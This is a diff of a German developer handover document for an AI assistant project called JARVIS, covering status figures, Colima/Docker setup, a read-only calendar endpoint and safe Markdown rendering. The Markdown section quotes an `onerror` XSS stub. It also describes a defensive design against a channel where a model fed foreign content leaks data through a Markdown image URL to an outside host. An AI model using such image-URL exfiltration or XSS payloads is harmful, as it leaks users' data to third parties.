@@ -1,6 +1,6 @@
 # JARVIS — Übergabe an eine neue Sitzung
 
-> **Stand: 25.08.2026, Commit `1e5f723` auf `main`.** Dieses Dokument ist der
+> **Stand: 25.08.2026, Commit `2da863a` auf `main`.** Dieses Dokument ist der
 > Einstieg für eine frische Claude-Code-Sitzung. Es ersetzt kein
 > Architekturdokument, sondern sagt, wo das Projekt steht und was als Nächstes
 > zu tun ist.
@@ -44,15 +44,22 @@ Deshalb trägt jede Datei aus `scripts/pruefpaket.py` den Commit im Kopf.
 
 | | |
 |---|---|
-| Commits | 76, Remote auf GitHub |
-| Tests | **1323** Python + 16 Browserdurchstiche — **0 übersprungen**, aber nur mit Diensten. Ohne Postgres und Redis überspringt `pytest` sämtliche Integrationstests (derzeit über 200) und meldet ein sattes Grün; genau dagegen steht `JARVIS_REQUIRE_SERVICES=1`. Eine feste Zahl steht hier bewusst nicht — sie veraltet mit jedem Block. |
+| Commits | 99, Remote auf GitHub |
+| Tests | **1341** Python + 18 Browserdurchstiche — **0 übersprungen**, aber nur mit Diensten. Ohne Postgres und Redis überspringt `pytest` sämtliche Integrationstests und meldet ein sattes Grün; genau dagegen steht `JARVIS_REQUIRE_SERVICES=1`. Die Zahlen veralten mit jedem Block — was nicht veraltet, ist die Bedingung: **0 übersprungen gilt nur mit Diensten.** |
 | **Security Invariant Coverage** | **58/59** |
-| mypy | `strict`, sauber über 108 Dateien |
+| mypy | `strict`, sauber über 123 Dateien |
 | Ruff | sauber (check + format) |
 | Datenbank | 33 Tabellen, 10 Migrationen, bi-direktional geprüft |
 | CI | GitHub Actions mit Postgres und Redis; **seit `0c28a5e` erstmals grün** — davor 45 Läufe, die im Einrichten abbrachen (uv-Version gab es nicht). Ohne Browserdurchstiche. |
 
 ### Was seit dem letzten Dossier geschah
+
+**Die Oberfläche zeigt Markdown, und der Kalender lässt sich lesen** (`ddca6e2`,
+`2da863a`). Zwei kleine Blöcke, und beide haben unterwegs etwas gefunden, das
+niemand gesucht hat: Markdown-Bildsyntax holt eine fremde Adresse ohne Zutun ab
+— ein Ausleitungskanal, den die Regel „kein rohes HTML" nicht abdeckt —, und
+die Rücknahme konnte ihre eigene Wirkung bis dahin nur in der Datenbank
+belegen. Die Einzelheiten stehen in Abschnitt 8.
 
 **Die Modellschleife ist angeschlossen** (`cc2ff24`, `da244dc`). Das war der
 benannte Engpass, und er ist an der Stelle geschlossen, die das vorige Dossier
@@ -248,6 +255,7 @@ cd ~/jarvis
 git pull                          # der lokale Checkout hinkt oft hinterher
 
 colima start                      # Container-Runtime (Docker Desktop ist NICHT installiert)
+export DOCKER_HOST="unix://$HOME/.colima/default/docker.sock"
 docker compose up -d              # Postgres 16 + pgvector, Redis 7
 uv sync --all-packages --python 3.12
 
@@ -280,6 +288,11 @@ anschlägt — der Katalog beschreibt das Deployment, er misst es nicht.
 **Wichtig:**
 
 - `docker compose` ist als CLI-Plugin verlinkt (`~/.docker/cli-plugins/docker-compose` → Homebrew).
+- **`colima start` setzt den Docker-Kontext nicht zuverlässig.** `docker context ls`
+  zeigt dann weiter `default` mit `/var/run/docker.sock`, und `docker compose`
+  läuft ins Leere („is the daemon running?"), obwohl die VM läuft. Der Socket
+  liegt unter `~/.colima/default/docker.sock`; `DOCKER_HOST` darauf zu setzen
+  ist der kürzeste Weg und die Zeile oben.
 - **Python 3.12 ist gepinnt.** Das System-Python ist 3.14.6; für MediaPipe,
   CTranslate2 und openWakeWord gibt es dort keine Wheels (ADR-001).
 - `timeout` existiert auf diesem macOS nicht — nicht in Skripten verwenden.
@@ -532,6 +545,11 @@ Ehrliche Liste. Nichts davon ist „fast fertig".
 ### Bekannte kleinere Mängel
 
 - `PostgresApprovalStore.open_for_user()` hat ein N+1. Vor der UI zu beheben.
+- **Rauschen im Browserlauf:** Der Server protokolliert je Durchgang zweimal
+  `RunNotStored` samt Traceback. Der Chat treibt einen Lauf weiter, während
+  `frischesSystem()` des nächsten Tests die Nutzer bereits geräumt hat. Kein
+  Fehlschlag — aber ein Traceback, der regelmäßig und folgenlos erscheint,
+  verdeckt den nächsten, der es nicht ist.
 - `test_invariant_coverage.py` sammelt Marker per AST-Scan über `tests/`.
 - Der Modellmodus von `advance` macht **einen** Versuch. Liefert das Modell
   keinen Werkzeugaufruf, endet der Schritt mit 409 und der Nutzer kann die
@@ -1108,10 +1126,33 @@ Registry und lief am Executor vorbei, der sonst protokolliert.
   kurzen Requests war das ein Kuriosum — bei einem Strom, der nie endet, hielt
   die Zeilensperre jeden weiteren Aufruf derselben Sitzung an. `touch()` läuft
   jetzt in eigener Transaktion.
-* **Kein Endpunkt liest den Kalender.** Aufgefallen beim Browsertest der
-  Rücknahme: Ob ein Termin danach weg ist, kann die Oberfläche nicht sehen.
-  Solange niemand einen Kalender *anzeigen* will, ist das folgenlos — beim
-  ersten Versuch nicht mehr.
+* ~~Kein Endpunkt liest den Kalender.~~ **Erledigt** (`2da863a`):
+  `GET /calendar?from&to&limit`. Der Browserdurchstich der Rücknahme prüft
+  jetzt vorher, dass der Termin da ist, und danach, dass er weg ist — bis
+  dahin belegte das nur ein `SELECT count(*)` im Testcode. Eine Zusage
+  („das kannst du rückgängig machen"), die nur die Datenbank überprüfen kann,
+  ist halb eingelöst.
+
+  **Der Endpunkt ist kein Werkzeug, und darin steckt die Entscheidung.** Ein
+  `calendar.read` wäre eine Fähigkeit: etwas, das ein Nutzer erteilen müsste,
+  das ein Modell vorschlagen könnte und dessen Ergebnis als Fremdinhalt in
+  einen Lauf liefe. Dieselbe Unterscheidung wie zwischen der Rücknahme und
+  einem `calendar.delete`. Damit das nicht bei der Absicht bleibt, liest ein
+  **eigener Adapter**: Der `PostgresCalendarStore`, den die Werkzeugregistry
+  hält, hat kein `list_events` — sonst stünde das Lesen einem künftigen
+  Handler offen, nicht weil es erlaubt wäre, sondern weil das Objekt es kann.
+  Ein Strukturtest in `test_layering.py` hält das fest.
+
+  Drei Entscheidungen in der Abfrage: `user_id` steht **in** der Anweisung
+  (ein fremder Termin ist nicht verboten, sondern nicht vorhanden);
+  `ends_at > :von` statt `starts_at >= :von`, weil gefragt ist, was im Fenster
+  *liegt* — wer um 10 Uhr nachsieht, will den Termin sehen, der um 9:30 begann
+  und noch läuft; und ohne `from` beginnt das Fenster jetzt, weil ein Kalender
+  „was kommt" beantwortet. `notes` steht nicht in der Antwort: Von allen
+  Feldern eines Termins trägt die Notiz am ehesten Fremdinhalt, und das
+  Ergebnismodell führte sie ohnehin nie. Sobald jemand einen Kalender
+  *anzeigt*, gehört das dort entschieden — mit Darstellung als Text und einer
+  Marke am Lauf, aus dem der Termin stammt.
 * ~~Der Chat.~~ **Erledigt** (`c17d112`). Und wieder fehlte der Weg in der
   Mitte: Der Ollama-Adapter konnte streamen, der Vertrag kannte `StreamChunk`
   und `TokenDelta` — das **Gateway** nicht. Wer Tokens fließen sehen wollte,
@@ -1136,10 +1177,23 @@ Registry und lief am Executor vorbei, der sonst protokolliert.
   sonst nur `executing` stünde — für immer. Ein Bildschirm, den niemand findet,
   ist keine Auflösung, und genau das prüft der Browserdurchstich: Er beginnt in
   der Übersicht.
-* **Markdown im Chat.** Heute ist die Antwort Text mit erhaltenen Umbrüchen.
-  `react-markdown` + `remark-gfm` **ohne** `rehype-raw` ist der dokumentierte
-  Weg (docs/10-ui.md §5); die Regel „kein rohes HTML aus Modellausgaben" gilt
-  unverändert.
+* ~~Markdown im Chat.~~ **Erledigt** (`ddca6e2`): `react-markdown` +
+  `remark-gfm` ohne `rehype-raw`. Nachgemessen statt vermutet — ohne das Plugin
+  bleibt rohes HTML **Text**: `<b>fett</b>` steht als Zeichenfolge da, ein
+  `<img src=x onerror=…>` erzeugt kein Element.
+
+  **Und dabei fiel die Lücke auf, die die HTML-Regel offen lässt.**
+  Markdown-Bildsyntax ist kein rohes HTML: `![](https://fremd/…?d=…)` ist
+  gültiges Markdown, und der Browser holt die Adresse **ohne Zutun** ab. In
+  einem Lauf, der Fremdinhalt tragen kann, ist das ein Ausleitungskanal — die
+  Adresse trägt, was das Modell hineinschreibt, und der Abruf verrät nebenbei
+  die IP. Ein Bild wird deshalb benannt statt geholt: ein Verweis mit
+  alt-Text, den ein Mensch anklicken muss. Der Durchstich misst dafür den
+  **Netzverkehr** und nicht das Markup — ob ein Element entsteht, ist die
+  Vermutung; ob eine Anfrage rausgeht, ist die Wirkung.
+
+  Offen bleibt Shiki samt Kopierbutton; das Dokument führt es als eigenen
+  Schritt.
 * ~~Ein Lauf läuft nicht von allein zu Ende.~~ **Erledigt** (`ddcad4d`), und
   dabei fiel die Hälfte auf, die niemand sieht: Ein Lauf **mitten im Plan** hat
   keinen Anspruch — er wird nach jedem Schritt freigegeben. Wer den Browser
@@ -1157,6 +1211,25 @@ Registry und lief am Executor vorbei, der sonst protokolliert.
   Ursache ist nicht gefunden; ein Retry wäre die falsche Antwort (die
   Konfiguration führt bewusst `retries: 0`). Wer es wiedersieht, hat mehr
   Material als ich.
+* **Und ein zweites, in pytest** (25.08.2026):
+  `test_worker_sweep.py::TestEinLiegengebliebenerLauf::test_ein_lauf_mitten_im_plan_wird_aufgegriffen`
+  schlug in **einem** Gate-Durchgang fehl — `stale_runs` fand **null**
+  Kandidaten, obwohl der Test unmittelbar davor `status='executing'` und
+  `claim_id IS NULL` aus der Datenbank gelesen hatte. Danach 8× einzeln grün,
+  die Integrationssuite grün, das ganze Gate grün.
+
+  Was gemessen ist, damit der Nächste nicht bei null anfängt: Die Bedingung ②
+  in `_UEBERFAELLIG` vergleicht **zwei Uhren** — `finished_at` schreibt der
+  Prozess, `now()` liefert die Datenbank —, und der Test setzt `idle=0`, also
+  Toleranz null. Der Abstand zwischen beiden lag in 200 Messungen bei 27–70 ms
+  und war nie negativ; über 40 s schwankte der Uhrenversatz zur Colima-VM
+  zwischen +4 ms und +129 ms. **Das erklärt den Fehlschlag nicht** — es zeigt
+  nur, wie dünn die Marge ist. Ein Vorzeichenwechsel von 30 ms genügte.
+
+  Wer es reproduziert: erst prüfen, ob der Versatz negativ geworden ist
+  (`SELECT clock_timestamp()` gegen die Prozessuhr). Falls ja, gehört die
+  Toleranz in den Test und nicht in die Abfrage — im Betrieb steht `idle` auf
+  60 s, dort ist der Versatz folgenlos.
 * **Kein Router in der Oberfläche.** Zwei Bereiche und ein Laufdetail kommen
   mit einem Zustand aus. Sobald ein Laufdetail eine Adresse braucht, die sich
   weitergeben und neu laden lässt, ist das die Gelegenheit für einen — dann mit
